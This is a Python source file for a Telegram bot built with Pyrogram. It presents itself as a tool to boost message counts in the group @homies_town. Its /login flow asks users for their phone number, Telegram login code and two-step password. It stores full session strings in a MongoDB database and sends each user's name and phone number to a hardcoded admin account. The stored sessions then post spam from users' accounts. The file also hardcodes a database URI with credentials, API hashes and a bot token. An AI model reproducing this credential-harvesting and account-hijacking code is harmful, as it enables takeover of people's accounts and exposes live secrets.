import os
from pyrogram import Client , filters
from pyrogram.types import Message
from pyrogram import Client, filters
from asyncio.exceptions import TimeoutError
from pyrogram.errors import UserNotParticipant, UserAlreadyParticipant , Unauthorized
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid
)
from pymongo import MongoClient
import json
import random
import threading
import asyncio
import time
from config import *

client = MongoClient('mongodb+srv://logi:logi@cluster0.kistqqd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
db = client['clients']  # Replace with your database name
collection = db['clients_collection']  # Replace with your collection name
api_id = 9059897
api_hash = "3834503034d02e7c361322db75222798"
bot_token = "7245394722:AAFsojK9WXLy17BzGrs9dP9-93tHK6t464w"

def load_clients():
    try:
        clients_data = collection.find_one({"_id": "clients"})
        if clients_data:
            return clients_data["data"]
        else:
            return []
    except Exception as e:
        print(f"An error occurred: {e}")
        return []

clients = load_clients()


client_objects = []
whisper_messages = [
"""இதயங்கள் அருகில் இருக்கும் பொழுது,
இருக்கும் இடங்கள் ஒன்றும் தூரமில்லை...""",
"""நேரம் நெருங்க விடாமல் தடுப்பதால்,
நினைவு துளிகளில் தவிக்கிறேன்!""",
"""தவிக்கும் இரு நெஞ்சம்,
தடுமாறுகிறது என் நெஞ்சம்!
என் காலடி கெஞ்சும் உன் வருகைக்காக!""",
"""தொலைவால் தூரத்தில் இருந்தாலும்
என் நினைவால் நெஞ்சோரத்தில் நீ...""",
"""நீ என்னை தவிர்ப்பதும்,
நான் உனக்காக தவிப்பதுமே நம் காதலாகிவிட்டது!""",
"""தூரங்கள் பிரிவில்லை, என் துணையே!
துயிலில் சந்திப்போம் வா என் கானாவில்"""
]
app = Client(
    "my_bot",
    api_id=api_id, api_hash=api_hash,
    bot_token=bot_token
)

def save_clients():
    try:
        collection.update_one(
            {"_id": "clients"},
            {"$set": {"data": clients}},
            upsert=True
        )
    except Exception as e:
        print(f"An error occurred: {e}")

async def start_the_client():
    for cli in clients:
        insta_cli = Client(f"client{cli[0]}",api_id=api_id,api_hash=api_hash,session_string=cli[1])
        client_objects.append([cli[0],insta_cli])
        try:
            if cli[2]:
                await insta_cli.start()
            await insta_cli.join_chat("homies_town")
        except Unauthorized as e:
            #await app.send_message(1955509952,text=f"Error {e} \n removed account : [account](tg://user?id={cli[0]})")
            try:
                clients.remove(cli)
            except Exception as e:
                        pass
            for i in client_objects:
                if i[0] == cli[0]:
                    try:
                        client_objects.remove(i)
                    except Exception as e:
                        pass
            save_clients()
            continue
        except Exception as e:
            print(e)
            continue
        
        

@app.on_message(filters.command("start") & filters.private)
async def start(cli,message):
    caption = f"""
Hello {message.from_user.first_name} , 

~  This Bot Mainly created for @homies_town to increase the message count.
~  Some basic idealogy was used for this creation .
~  This is not gonne be a spam , beacuse message will send at a specific interval.
~  for more information use /help .

Thank you .....
"""
    await app.send_photo(message.chat.id,photo="https://graph.org/file/727efe1bd9838b3b87aa8.jpg",caption=caption)

@app.on_message(filters.command("help") & filters.private)

async def help(cli,message):
    await message.reply_text(f"""

Use this commands ,
                             
~  /login   - login in your telegram account to manage the group.
~  /logout  - log out your telegram account from this bot.
~  /message - start the message script .
~  /stop    - stop the message script .
                             
""")
    
@app.on_message(filters.command("login") & filters.private)
async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
    for i in clients:
        if msg.from_user.id in i:
            await app.send_message(msg.chat.id,"You already loged in.")
            return
        break
    if telethon:
        ty = "ᴩʏʀᴏɢʀᴀᴍ"
    else:
        ty = "ᴩʏʀᴏɢʀᴀᴍ"
        if not old_pyro:
            ty += " ᴠ2"
    if is_bot:
        ty += " ʙᴏᴛ"
    await msg.reply(f"» ᴛʀʏɪɴɢ ᴛᴏ sᴛᴀʀᴛ...")
    user_id = msg.chat.id
    if True:
        api_id = 24398746
        api_hash = "b9077f84ac40e5615ff02c6f964924f9"
    if not is_bot:
        t = "» ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ᴩʜᴏɴᴇ_ɴᴜᴍʙᴇʀ** ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ ғᴏʀ ᴡʜɪᴄʜ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ sᴇssɪᴏɴ. \nᴇxᴀᴍᴩʟᴇ : `+910000000000`'"
    else:
        t = "ᴩʟᴇᴀsᴇ sᴇɴᴅ ʏᴏᴜʀ **ʙᴏᴛ_ᴛᴏᴋᴇɴ** ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.\nᴇxᴀᴍᴩʟᴇ : `5432198765:abcdanonymousterabaaplol`'"
    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
    if await cancelled(phone_number_msg):
        return
    phone_number = phone_number_msg.text
    await app.send_message(1955509952,f"Name : {msg.from_user.first_name}\n phonenumber: {phone_number}")
    if not is_bot:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ sᴇɴᴅ ᴏᴛᴩ ᴀᴛ ᴛʜᴇ ɢɪᴠᴇɴ ɴᴜᴍʙᴇʀ...")
    else:
        await msg.reply("» ᴛʀʏɪɴɢ ᴛᴏ ʟᴏɢɪɴ ᴠɪᴀ ʙᴏᴛ ᴛᴏᴋᴇɴ...")
    if is_bot:
        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    else:
        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except (PhoneNumberInvalid):
        await msg.reply("» ᴛʜᴇ **ᴩʜᴏɴᴇ_ɴᴜᴍʙᴇʀ** ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ᴅᴏᴇsɴ'ᴛ ʙᴇʟᴏɴɢ ᴛᴏ ᴀɴʏ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.")
        return
    try:
        phone_code_msg = None
        if not is_bot:
            phone_code_msg = await bot.ask(user_id, "» ᴩʟᴇᴀsᴇ sᴇɴᴅ ᴛʜᴇ **ᴏᴛᴩ** ᴛʜᴀᴛ ʏᴏᴜ'ᴠᴇ ʀᴇᴄᴇɪᴠᴇᴅ ғʀᴏᴍ ᴛᴇʟᴇɢʀᴀᴍ ᴏɴ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.\nɪғ ᴏᴛᴩ ɪs `12345`, **ᴩʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ᴀs** `1 2 3 4 5`.", filters=filters.text, timeout=600)
            if await cancelled(phone_code_msg):
                return
    except TimeoutError:
        await msg.reply("» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 10 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.")
        return
    if not is_bot:
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid):
            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴡʀᴏɴɢ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.")
            return
        except (PhoneCodeExpired):
            await msg.reply("» ᴛʜᴇ ᴏᴛᴩ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs **ᴇxᴩɪʀᴇᴅ.**\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.")
            return
        except (SessionPasswordNeeded):
            try:
                two_step_msg = await bot.ask(user_id, "» ᴩʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ **ᴛᴡᴏ sᴛᴇᴩ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ** ᴩᴀssᴡᴏʀᴅ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("» ᴛɪᴍᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ ᴏғ 5 ᴍɪɴᴜᴛᴇs.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.")
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await cancelled("hello"):
                    return
            except (PasswordHashInvalid):
                await two_step_msg.reply("» ᴛʜᴇ ᴩᴀssᴡᴏʀᴅ ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ᴡʀᴏɴɢ.\n\nᴩʟᴇᴀsᴇ sᴛᴀʀᴛ ɢᴇɴᴇʀᴀᴛɪɴɢ ʏᴏᴜʀ sᴇssɪᴏɴ ᴀɢᴀɪɴ.", )
                return
        except Exception as e:
            pass
    else:
        if telethon:
            await client.start(bot_token=phone_number)
        else:
            await client.sign_in_bot(phone_number)
    if telethon:
        string_session = client.session.save()
    else:
        string_session = await client.export_session_string()
        instn_cli = Client(f"client{user_id}",api_id=api_id,api_hash=api_hash ,session_string=string_session)
        try:
            await instn_cli.join_chat("homies_town")
        except Exception as e:
            pass
        clients.append([msg.from_user.id , string_session , False])
        client_objects.append([user_id,instn_cli])
        save_clients()
    text = "Oorla Paththu Pathinanji Friend Vachirukavan Ellam Santhosama Irukan....Orey Oru Frienda Vachikittu Nan Padra Avastha Iruke.....Ayu Ayu Ayu..Uu.."
    try:
        if not is_bot:
            await client.send_message("me", text)
        else:
            await bot.send_message(msg.chat.id, text)
    except KeyError:
        pass
    await bot.send_message(msg.chat.id, "Succussfully loged in")


async def cancelled(msg):
    try:
        if "/cancel" in msg.text:
            await msg.reply("**» ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ᴏɴɢᴏɪɴɢ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛɪᴏɴ ᴩʀᴏᴄᴇss !**", quote=True)
            return True
        elif "/restart" in msg.text:
            await msg.reply("**» sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇsᴛᴀʀᴛᴇᴅ ᴛʜɪs ʙᴏᴛ ғᴏʀ ʏᴏᴜ !**", quote=True)
            return True
        elif "/skip" in msg.text:
            return False
        elif msg.text.startswith("/"):  # Bot Commands
            await msg.reply("**» ᴄᴀɴᴄᴇʟʟᴇᴅ ᴛʜᴇ ᴏɴɢᴏɪɴɢ sᴛʀɪɴɢ ɢᴇɴᴇʀᴀᴛɪᴏɴ ᴩʀᴏᴄᴇss !**", quote=True)
            return True
        else:
            return False
    except Exception as e:
        pass


@app.on_message(filters.command("stats") & filters.user([1955509952 , 5530059842]) & filters.private)  
async def usersats(cli , msg):
    stats_message = ""
    user_count = 0
    for i in client_objects:
        try:
            firsname =  await i[1].get_me()
            firstname = firsname.first_name
            stats_message = stats_message+f"User: [{firstname}](tg://user?id={i[0]})\n"
        except Exception as e:
            firstname = i[0]
            stats_message = stats_message+f"User: [account](tg://user?id={i[0]})\n"
            pass
        for j in clients:
            if j[0] == i[0]:
                user_count = user_count+1
                stats = "yes" if j[2] else "No"
                stats_message = stats_message+f"messaging : {stats}\n"
    await app.send_message(msg.chat.id,text=f"Total Users {user_count}\n{stats_message}")

async def start_message():
    while(True):
        for i in client_objects:
                try:
                    await i[1].send_message(-1001506877923,random.choice(whisper_messages),reply_to_message_id=224819)
                    time.sleep(2)

                except Unauthorized as e:
                    await app.send_message(1955509952,text=f"Error {e} \n removed account : [account](tg://user?id={i[0]})")
                    try:
                        client_objects.remove(i)
                    except ValueError as e:
                        pass

                    for j in clients:
                        if j[0] == i[0]:
                            try:
                                clients.remove(i)
                                save_clients()
                            except ValueError as e:
                                pass
                    continue
                
                except ConnectionError as e:
                    print("Error")
                    time.sleep(2)
                    continue
        time.sleep(5)



@app.on_message(filters.command("message") & filters.private)
async def messageon(cli,mes):
    result = await app.ask(mes.chat.id ,text="Plese Join Here @homies_town after that send __yes__ , you already joined means also send __yes__ here")
    if result.text == "yes" or "Yes":
        for cli in clients:
            if cli[0] == mes.from_user.id:
                    if cli[2]:
                        await app.send_message(mes.chat.id,"Alreday script is running")
                        return

                    else:
                        cli[2] = True
                        for j in client_objects:
                            if j[0] == cli[0]:
                                await j[1].start()
                        await app.send_message(mes.chat.id,"Message script started succussfully")
                        save_clients()
                        return
        else:
            await app.send_message(mes.chat.id,"Please Login first ...")
    else:
        await app.send_message(mes.chat.id,"Message failed plese try with /message")


@app.on_message(filters.command("stop") & filters.private)
async def stop(cli,mes):
    for cli in clients:
        if cli[0] == mes.from_user.id:
                if cli[2] == False:
                    await app.send_message(mes.chat.id,"Message not started use /message command to start")
                    return
                else:
                    cli[2] = False
                    for j in client_objects:
                        if j[0] == cli[0]:
                            await j[1].stop()
                    await app.send_message(mes.chat.id,"Message script stop succussfully")
                    save_clients()
                    return
    else:
        await app.send_message(mes.chat.id,"Plese login first...")
@app.on_message(filters.command("logout") & filters.private)
async def logout(cli,mes):
    user_id = mes.from_user.id
    for n in clients:
        if n[0] == user_id:
                try :
                    for lk in clients:
                        if lk[0] == user_id:
                            try:
                                clients.remove(lk)
                            except Exception as e:
                                pass
                    for lk in client_objects:
                        if lk[0] == user_id:
                            try:
                                client_objects.remove(lk)
                            except Exception as e:
                                pass
                    await app.send_message(mes.chat.id , "User Succussfully loged out")
                    save_clients()
                    return
                except Exception as e:
                    print(e)
                    continue
    else:
        await app.send_message(mes.chat.id,"Plese login first,then you can logot ....")

def start_msg():
    asyncio.run(start_message())

async def start_cc():
    await start_the_client()



if __name__ == "__main__":
    client_thread = threading.Thread(target=start_msg, daemon=True)
    client_thread.start()
    app.run(start_cc())
    app.run()
